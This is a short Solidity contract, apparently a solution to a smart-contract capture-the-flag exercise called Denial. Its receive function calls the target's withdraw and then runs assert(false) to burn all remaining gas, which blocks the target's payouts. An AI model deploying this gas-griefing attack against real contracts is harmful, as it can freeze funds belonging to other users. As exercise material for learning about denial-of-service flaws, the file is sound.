// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";

contract AttackingDenial {
    Denial public denial;

    constructor(address payable _denial) {
        denial = Denial(_denial);
    }

    //Code me!
    receive() external payable {
        denial.withdraw();
        // use up all the gas with assert(false)
        assert(false);
    }
}
